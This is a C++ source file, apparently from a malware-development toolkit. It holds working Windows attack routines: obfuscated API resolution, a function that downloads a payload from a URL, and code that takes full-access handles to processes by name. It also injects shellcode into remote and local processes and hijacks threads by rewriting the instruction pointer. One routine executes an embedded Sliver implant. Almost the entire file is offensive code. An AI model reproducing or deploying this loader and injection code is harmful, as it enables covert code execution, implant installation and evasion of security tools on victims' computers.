	std::string deobbed_ntprotect = rockyGetString(str_NtProtectVirtualMemory, big_string, sizeof(str_NtProtectVirtualMemory));
	const char* deobbed_ntprotect_mem = deobbed_ntprotect.c_str();
	using s_NtProtectVirtualMemory = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
	s_NtProtectVirtualMemory pNtProtectVirtualMemory = (s_NtProtectVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_ntprotect_mem);
	if (pNtProtectVirtualMemory == NULL) {
		rockyPrintColor(red, "Failed to get address of NtProtectVirtualMemory");
		return STATUS_NOT_FOUND;
	}

	// Prepare parameters for the function call
	PVOID baseAddressPtr = baseAddress;
	SIZE_T regionSizeVal = regionSize;

	// Call NtProtectVirtualMemory
	NTSTATUS status = pNtProtectVirtualMemory(hProcess, &baseAddressPtr, &regionSizeVal, newProtect, oldProtect);

	// Check the status of the call
	if (status != STATUS_SUCCESS) {
		rockyPrintColor(red, "NtProtectVirtualMemory failed with status: %lx", status);
		return status;
	}

	return STATUS_SUCCESS;
}

// Get a file's payload from a url (http or https)
// Return a base address of a heap allocated buffer, thats the payload
// Return the payload's size
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL; 	 			// Used as the total payload size

	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
		pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the payload using the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving 
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}

// EnumProcesses Implementation 
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {

	DWORD		adwProcesses[1024 * 2],
		dwReturnLen1 = NULL,
		dwReturnLen2 = NULL,
		dwNmbrOfPids = NULL;

	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;

	WCHAR		szProc[MAX_PATH];

	// Get the array of pid's in the system
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array returned 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is NULL
		if (adwProcesses[i] != NULL) {

			// Opening a process handle 
			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// if EnumProcessModules succeeded
					// get the name of 'hProcess', and saving it in the 'szProc' variable 
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Perform the comparison logic
						if (wcscmp(szProcName, szProc) == 0) {
							// wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", szProc, adwProcesses[i]);
							// return by reference
							*pdwPid = adwProcesses[i];
							*phProcess = hProcess;
							break;
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	// Check if pdwPid or phProcess are NULL
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

BOOL PrintProcesses() {

	DWORD		adwProcesses[1024 * 2],
		dwReturnLen1 = NULL,
		dwReturnLen2 = NULL,
		dwNmbrOfPids = NULL;

	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;

	WCHAR		szProc[MAX_PATH];

	// get the array of pid's in the system
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// calculating the number of elements in the array returned 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// a small check
		if (adwProcesses[i] != NULL) {

			// opening a process handle 
			if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// if EnumProcessModules succeeded
					// get the name of 'hProcess', and saving it in the 'szProc' variable 
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// printing the process name & its pid
						wprintf(L"[%0.3d] Process \"%s\" - Of Pid : %d \n", i, szProc, adwProcesses[i]);
					}
				}

				// close process handle 
				CloseHandle(hProcess);
			}
		}

		// Iterate through the PIDs array  
	}

	return TRUE;
}

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);

BOOL GetRemoteProcessHandleUsingNtQuerySystem(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {

	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
	ULONG							uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;

	// getting NtQuerySystemInformation address
	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// First NtQuerySystemInformation call
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)
	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	while (TRUE) {

		// wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", SystemProcInfo->ImageName.Buffer, SystemProcInfo->UniqueProcessId);

		// Check the process's name size
		// Comparing the enumerated process name to the intended target process
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
			// openning a handle to the target process and saving it, then breaking 
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// if NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// Free the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Check if we successfully got the target process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

/* THREAD HIJACKING - LOCAL THREAD CREATION */
// dummy function to use for the sacrificial thread
VOID DummyFunction() {

	// stupid code
	int		j = rand();
	int		i = j * j;

}

/*
Thread Execution Hijacking is a technique that can execute a payload without the need of creating a new thread.
The way this technique works is by suspending the thread and updating the register that points to the next instruction in memory to point to the start of the payload.
When the thread resumes execution, the payload is executed.
*/
BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	// Initialize the thread context
	CONTEXT ThreadCtx = {};
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	// Allocate memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copy the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Change memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Update the instruction pointer to point to the payload
#ifdef _WIN64
	ThreadCtx.Rip = reinterpret_cast<DWORD64>(pAddress);
#else
	ThreadCtx.Eip = reinterpret_cast<DWORD>(pAddress);
#endif

	// Set the new thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

// THREAD HIJACKING - REMOTE THREAD CREATION 
/*
Parameters:
	- lpProcessName; a process name under '\System32\' to create
	- dwProcessId; A pointer to a DWORD that recieves the process ID.
	- hProcess; A pointer to a HANDLE that recieves the process handle.
	- hThread; A pointer to a HANDLE that recieves the thread handle.

Creates a new process 'lpProcessName' in suspended state and return its pid, handle, and the handle of its main thread
*/
// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)
BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFOA				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable (this is usually 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// creation flags	
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUT parameters with CreateProcessA's output
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

/*
	'InjectShellcodeToRemoteProcess' is explained in the "Process Injection - Shellcode beginner" module:
		it inject the input payload into 'hProcess' and return the base address of where did the payload got written
*/
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	*ppAddress = rockyVirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);


	printf("\t[#] Press <Enter> To Write Payload ... ");
	(void)getchar();
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

/*

Parameters:
	- hThread; suspended thread handle
	- pAddress; base address of the shellcode written to the process running 'hThread'

Performs thread hijacking, and resumes the thread after to run the payload at 'pAddress'

*/
BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
	CONTEXT ThreadCtx = {};
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	// getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip = reinterpret_cast<DWORD64>(pAddress);

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\n\t[#] Press <Enter> To Run ... ");
	(void)getchar();

	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}


// THREAD HIJACKING - LOCAL THREAD ENUMERATION 
/* Once a valid handle to the target thread has been obtained,
it can be passed to the HijackThread function. The SuspendThread WinAPI will be used
to suspend the thread and then GetThreadContext and SetThreadContext will be used to update the RIP register
to point to the payload's base address. Additionally, the payload must be written to the local process memory 
before hijacking the thread.
*/
BOOL HijackThreadAlt(IN HANDLE hThread, IN PVOID pAddress) {
	CONTEXT ThreadCtx = { ThreadCtx.ContextFlags = CONTEXT_ALL };

	// Suspend the thread and check if successful
	DWORD dwSuspendCount = SuspendThread(hThread);
	if (dwSuspendCount == (DWORD)-1) {
		printf("\t[!] SuspendThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	// Get the thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	// Ensure the address is correctly cast to the RIP register
	ThreadCtx.Rip = reinterpret_cast<ULONG_PTR>(pAddress);

	// Set the thread context with the new RIP
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	printf("\t[#] Press <Enter> To Run ... ");
	(void)getchar();  // Wait for user input to proceed

	// Resume the thread and wait for it to finish
	if (ResumeThread(hThread) == (DWORD)-1) {
		printf("\t[!] ResumeThread Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	//WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}

BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
	DWORD dwProcessId = GetCurrentProcessId();
	HANDLE hSnapShot = NULL;
	THREADENTRY32 Thr = { Thr.dwSize = sizeof(THREADENTRY32) };

	// Take a snapshot of the currently running processes' threads
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!Thread32First(hSnapShot, &Thr)) {
		printf("\n\t[!] Thread32First Failed With Error: %d\n", GetLastError());
		CloseHandle(hSnapShot);
		return FALSE;
	}

	do {
		if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwMainThreadId) {
			*dwThreadId = Thr.th32ThreadID;
			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (*hThread == NULL) {
				printf("\n\t[!] OpenThread Failed With Error: %d\n", GetLastError());
				CloseHandle(hSnapShot);
				return FALSE;
			}
			break;
		}
	} while (Thread32Next(hSnapShot, &Thr));

	CloseHandle(hSnapShot);

	return (*dwThreadId != 0 && *hThread != NULL);
}

BOOL InjectShellcodeToLocalProcess(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
	DWORD dwOldProtection = 0;

	// Allocate memory in the local process for the payload
	*ppAddress = VirtualAlloc(NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	printf("\t[i] Allocated Memory At: 0x%p\n", *ppAddress);

	// Wait for user input to proceed
	printf("\t[#] Press <Enter> To Write Payload ... ");
	(void)getchar();

	// Copy the shellcode to the allocated memory
	memcpy(*ppAddress, pShellcode, sSizeOfShellcode);

	// Change memory protection to execute
	if (!VirtualProtect(*ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


void HijackProcess() {
	HANDLE hThread = NULL;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	DWORD dwCurrentPID = GetCurrentProcessId();
	DWORD dwMainThreadID = GetCurrentThreadId();
	DWORD dwThreadID = NULL;
	THREADENTRY32 ThreadEntry;
	ThreadEntry.dwSize = sizeof(THREADENTRY32);
	HANDLE hSnapshot = NULL;
	CONTEXT Threadctx;
	Threadctx.ContextFlags = CONTEXT_ALL;
	PBYTE Shellcode = NULL;
	DWORD dwOldProtection = NULL;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to create snapshot." << std::endl;
		return;
	}

	if (!Thread32First(hSnapshot, &ThreadEntry)) {
		std::cerr << "Failed to find the first thread." << std::endl;
		return;
	}

	do {
		if (ThreadEntry.th32OwnerProcessID == dwCurrentPID && ThreadEntry.th32ThreadID != dwMainThreadID) {
			dwThreadID = ThreadEntry.th32ThreadID;
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID);
			if (hThread != NULL && dwThreadID != NULL) {
				break;
			}
		}
	} while (Thread32Next(hSnapshot, &ThreadEntry));

	if (hThread == NULL || dwThreadID == NULL) {
		std::cerr << "Failed to find a valid thread." << std::endl;
		return;
	}

	// Allocate memory for the shellcode in the target process
	Shellcode = (PBYTE)VirtualAllocEx(hProcess, NULL, sliver_implant_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (Shellcode == NULL) {
		std::cerr << "Failed to allocate memory for shellcode." << std::endl;
		return;
	}

	// Write the shellcode to the allocated memory
	if (!WriteProcessMemory(hProcess, Shellcode, sliver_implant, sliver_implant_size, NULL)) {
		std::cerr << "Failed to write shellcode to memory." << std::endl;
		return;
	}

	// Change memory protection to execute
	if (!VirtualProtectEx(hProcess, Shellcode, sliver_implant_size, PAGE_EXECUTE_READ, &dwOldProtection)) {
		std::cerr << "Failed to change memory protection." << std::endl;
		return;
	}

	// Suspend the thread before hijacking it
	if (SuspendThread(hThread) == (DWORD)-1) {
		std::cerr << "Failed to suspend thread." << std::endl;
		return;
	}

	// Get the thread context
	if (!GetThreadContext(hThread, &Threadctx)) {
		std::cerr << "Failed to get thread context." << std::endl;
		return;
	}

	// Modify the RIP to point to the shellcode
	Threadctx.Rip = (DWORD64)Shellcode;

	// Set the new context to hijack the thread
	if (!SetThreadContext(hThread, &Threadctx)) {
		std::cerr << "Failed to set thread context." << std::endl;
		return;
	}

	// Resume the thread to run the shellcode
	if (ResumeThread(hThread) == (DWORD)-1) {
		std::cerr << "Failed to resume thread." << std::endl;
		return;
	}

	std::cout << "Thread hijacked and shellcode executed!" << std::endl;
	CloseHandle(hThread);
	CloseHandle(hSnapshot);
}


